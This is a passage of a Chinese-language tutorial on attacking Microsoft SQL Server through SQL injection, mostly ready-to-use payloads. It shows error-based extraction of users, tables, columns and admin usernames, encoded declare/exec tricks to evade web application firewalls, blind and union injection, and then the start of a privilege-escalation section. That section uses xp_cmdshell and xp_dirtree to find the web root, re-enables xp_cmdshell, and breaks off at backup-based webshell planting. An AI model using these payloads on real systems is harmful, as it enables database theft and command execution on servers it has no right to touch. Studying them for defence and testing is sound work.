</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="o">|</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">)</span><span class="c1">--
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">在将</span><span class="w"> </span><span class="n">nvarchar</span><span class="w"> </span><span class="err">值</span><span class="w"> </span><span class="s1">&#39;dbo&#39;</span><span class="w"> </span><span class="err">转换成数据类型</span><span class="w"> </span><span class="nb">int</span><span class="w"> </span><span class="err">时失败。</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>显示转换也就是利用函数来转换，我们经常用到的两个函数就是 cast 和 convert</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">CAST</span><span class="p">(</span><span class="k">USER</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nb">int</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">convert</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span><span class="k">user</span><span class="p">))</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>判断当前数据库：</strong></p>
<p><code>id=1'and db_name()&gt;0;--</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152616.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152616.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152616.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152616.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152616.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152616.png-water_print" /></p>
<p><strong>爆表名：</strong></p>
<p><code>id=1' and 1=(select top 1 name from sysobjects where xtype='u' and name !='info');--</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152643.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152643.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152643.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152643.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152643.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152643.png-water_print" /></p>
<p><strong>爆列名：</strong></p>
<p><code>id=1' and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'admin') and name&lt;&gt;'id');--</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152732.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152732.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152732.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152732.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152732.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152732.png-water_print" /></p>
<p><strong>爆数据：</strong></p>
<p><code>id=1' and 1=(select top 1 username from admin);--</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152807.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152807.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152807.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152807.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152807.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120152807.png-water_print" /></p>
<h4 id="412-其它用法">4.1.2 其它用法</h4>
<p>当然查询数据库的所有表还可以使用 <code>INFORMATION_SCHEMA.TABLES</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="p">);</span><span class="c1">--
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>要判断当前表名和列名，也可以使用  <code>having 1=1</code>  和  <code>group by</code></p>
<p><code>id=1 having 1=1</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153503.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153503.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153503.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153503.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153503.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153503.png-water_print" /></p>
<p><strong>爆出当前表和字段：</strong></p>
<p><code>id=1 group by info.id,info.name having 1=1</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153547.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153547.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153547.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153547.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153547.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120153547.png-water_print" /></p>
<h4 id="413-简单注入绕过">4.1.3 简单注入绕过</h4>
<p>这里引入一个 <code>declare</code>  函数，他是 mssql 声明局部变量的函数，我们经常用它来绕过 waf 对一些关键词的拦截</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">a</span><span class="w"> </span><span class="n">nvarchar</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="o">@</span><span class="n">a</span><span class="o">=</span><span class="s1">&#39;select convert(int,@@version)&#39;</span><span class="w"> </span><span class="k">exec</span><span class="p">(</span><span class="o">@</span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="c1">--
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>declare 定义变量，set 设置变量值，exec 执行变量</p>
<p>变量的值是支持 hex 和 ascii 码的，当过滤引号我们就可以这么用把我们的语句编码一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="o">=</span><span class="mi">0</span><span class="n">x73656c65637420636f6e7665727428696e742c404076657273696f6e29</span><span class="w"> </span><span class="k">exec</span><span class="p">(</span><span class="o">@</span><span class="n">s</span><span class="p">)</span><span class="c1">--
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="o">=</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">118</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">44</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">118</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">114</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">105</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">111</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">41</span><span class="p">)</span><span class="w"> </span><span class="k">exec</span><span class="p">(</span><span class="o">@</span><span class="n">s</span><span class="p">)</span><span class="c1">--
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="42-盲注">4.2 盲注</h3>
<p>其实跟 mysql 大同小异无非就是分割字符串比较，但是 mssql 的盲注套路确实没那么多。</p>
<h4 id="421-布尔盲注">4.2.1 布尔盲注</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="k">substring</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">109</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="422-时间盲注">4.2.2 时间盲注</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">))</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="n">WAITFOR</span><span class="w"> </span><span class="n">DELAY</span><span class="w"> </span><span class="s1">&#39;0:0:5&#39;</span><span class="c1">--
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="k">substring</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">1</span><span class="w"> </span><span class="n">WAITFOR</span><span class="w"> </span><span class="n">DELAY</span><span class="w"> </span><span class="s1">&#39;0:0:5&#39;</span><span class="c1">--
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="42-联合注入">4.2 联合注入</h3>
<p>mssql 联合注入我们一般不使用数字占位，而是 null，因为使用数字占位可能会发生隐式转换</p>
<p><code>id=1 union select null,name,pass from info</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161528.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161528.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161528.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161528.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161528.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161528.png-water_print" /></p>
<p>也可以利用如下方法：</p>
<p><code>id=1 SELECT 1 UNION (select CAST(USER as int))</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161612.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161612.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161612.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161612.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161612.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120161612.png-water_print" /></p>
<h2 id="5-mssql-提权">5 MSSQL 提权</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120182207.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120182207.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120182207.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120182207.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120182207.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210120182207.png-water_print" /></p>
<h3 id="51-备份拿-shell">5.1 备份拿 shell</h3>
<p>备份拿 shell 也就涉及到了权限的问题，SA 权限不用说没有降权的话基本能做任何事情了，它数据库权限是 <code>db_owner</code>，当然其他用户如果也拥有 <code>db_owner</code> 基本也可以通过备份拿下 shell，但是在设置目录权限后就不行了。</p>
<h4 id="511-路径的寻找">5.1.1 路径的寻找</h4>
<p>需要路径的我们一般有几个思路：</p>
<ol>
<li>报错寻找</li>
<li>字典</li>
<li>旁站信息收集</li>
<li>调用储存过程来搜索</li>
<li>读配置文件</li>
</ol>
<p>这里我们着重讨论一下储存过程也就是这些函数来找我们的网站根目录。一般我们可以用 <code>xp_cmdshell</code>、<code>xp_dirtree</code>、<code>xp_dirtree</code>、<code>xp_subdirs</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="w">       </span><span class="o">//</span><span class="err">列出所有</span><span class="w"> </span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="w"> </span><span class="err">文件和目录</span><span class="p">,</span><span class="err">子目录</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="p">,</span><span class="mi">1</span><span class="w">     </span><span class="o">//</span><span class="err">只列</span><span class="w"> </span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="w"> </span><span class="err">文件夹</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="w">   </span><span class="o">//</span><span class="err">列</span><span class="w"> </span><span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="w"> </span><span class="err">文件夹加文件</span><span class="w"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>通过执行 <code>xp_dirtree</code> 返回我们传入的参数，如果没有回显的话，可以这样创建一个临时的表插入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">tmp</span><span class="w"> </span><span class="p">(</span><span class="n">dir</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">8000</span><span class="p">),</span><span class="n">num</span><span class="w"> </span><span class="nb">int</span><span class="p">,</span><span class="n">num1</span><span class="w"> </span><span class="nb">int</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">tmp</span><span class="p">(</span><span class="n">dir</span><span class="p">,</span><span class="n">num</span><span class="p">,</span><span class="n">num1</span><span class="p">)</span><span class="w"> </span><span class="k">execute</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;c:&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>xp_cmdshell</code> 寻找路径：</p>
<p>这个 <code>xp_cmdshell</code> 找起来更加方便我们调用cmd的命令去搜索，比如我的web目录有个1.aspx</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\G</span>ee&gt;for /r c:<span class="se">\ </span>%i in <span class="o">(</span>1*.aspx<span class="o">)</span> <span class="k">do</span> @echo %i
</span></span><span class="line"><span class="cl">c:<span class="se">\w</span>ww<span class="se">\1</span>.aspx
</span></span></code></pre></td></tr></table>
</div>
</div><p>所以只需要建立一个表，存在一个 char 字段就可以了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">cmdtmp</span><span class="w"> </span><span class="p">(</span><span class="n">dir</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">8000</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">cmdtmp</span><span class="p">(</span><span class="n">dir</span><span class="p">)</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;for /r c:\ %i in (1*.aspx) do @echo %i&#39;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>SQL Server 阻止了对组件 <code>xp_cmdshell</code> 的过程 <code>sys.xp_cmdshell</code> 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用。</p>
<p>如果遇到 xp_cmdshell 不能调用，报错，可用如下命令恢复：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 允许修改高级参数 
</span></span><span class="line"><span class="cl">;EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 打开xp_cmdshell 扩展
</span></span><span class="line"><span class="cl">;EXEC sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;--
</span></span></code></pre></td></tr></table>
</div>
</div></div>
        </div>
    </div>
<h4 id="512-差异备份">5.1.2 差异备份</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">//</span><span class="w"> </span><span class="err">完整备份一次</span><span class="p">(</span><span class="err">保存位置可以改</span><span class="p">)</span><span class="w">
